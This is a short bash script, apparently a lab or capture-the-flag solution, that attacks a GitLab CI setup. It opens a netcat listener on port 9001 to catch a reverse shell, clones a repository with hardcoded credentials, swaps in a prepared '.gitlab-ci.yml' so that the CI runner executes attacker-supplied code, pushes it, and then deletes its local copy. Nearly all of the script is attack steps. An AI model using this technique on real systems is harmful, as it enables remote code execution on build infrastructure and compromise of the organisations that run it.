#!/bin/bash
x-terminal-emulator -e nc -lvnp 9001 & git clone http://battlebot:battlebot@<gitlab_ip_address>/battlebot/testrepo.git
cd testrepo
cp ../solution_.gitlab-ci.yml .gitlab-ci.yml
git add .gitlab-ci.yml
git commit -m "BATTLEBOT ACTIVATED"
git push
cd ..
rm -rf testrepo